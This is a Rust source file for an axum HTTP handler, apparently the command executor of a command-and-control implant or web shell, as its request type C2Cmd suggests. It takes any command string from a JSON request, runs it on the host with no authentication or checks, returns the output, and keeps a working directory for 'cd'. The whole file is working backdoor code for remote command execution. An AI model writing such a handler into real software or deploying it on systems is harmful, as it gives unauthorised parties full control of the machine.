use super::ShellPath;
use axum::{response::Html, Extension, Json};
use serde::Deserialize;
use std::path::{Path, PathBuf};

#[derive(Deserialize)]
pub struct C2Cmd {
    cmd: String,
}

pub async fn exec_cmd<'a>(
    Extension(mut ext): Extension<ShellPath>,
    Json(body): Json<C2Cmd>,
) -> Html<String> {
    let mut cmdvec = body.cmd.split_whitespace();
    let cmd_bin_name = cmdvec.next().unwrap();

    let output = if cmd_bin_name == "cd" {
        manage_path(&mut ext, cmdvec.collect::<Vec<&str>>());
        "".to_string()
    } else {
        let op = std::process::Command::new(cmd_bin_name)
            .args(cmdvec.collect::<Vec<&str>>())
            .current_dir(&ext.pwd)
            .output()
            .unwrap();

        format!(
            "{}\n{}",
            String::from_utf8(op.stdout).unwrap(),
            String::from_utf8(op.stderr).unwrap()
        )
    };

    Html(output)
}

fn manage_path(ext: &mut ShellPath, cmd_rest: Vec<&str>) {
    if cmd_rest.len() == 0 || cmd_rest[0] == "~" {
        let p = std::mem::replace(&mut ext.pwd, ext.home_dir.clone());
        let _ = std::mem::replace(&mut ext.old_pwd, p);
    } else if cmd_rest[0] == ".." {
        ext.old_pwd = ext.pwd.clone();
        ext.pwd.pop();
    } else if cmd_rest[0] == "-" {
        std::mem::swap(&mut ext.old_pwd, &mut ext.pwd);
    } else {
        let new_path = Box::new(Path::new(cmd_rest[0]));
        if new_path.is_relative() {
            ext.old_pwd = ext.pwd.clone();
            ext.pwd.push(*new_path);
        } else if new_path.is_absolute() {
            let p1 = PathBuf::from(*new_path);
            let p2 = std::mem::replace(&mut ext.pwd, p1);
            let _ = std::mem::replace(&mut ext.old_pwd, p2);
        }
    }
}
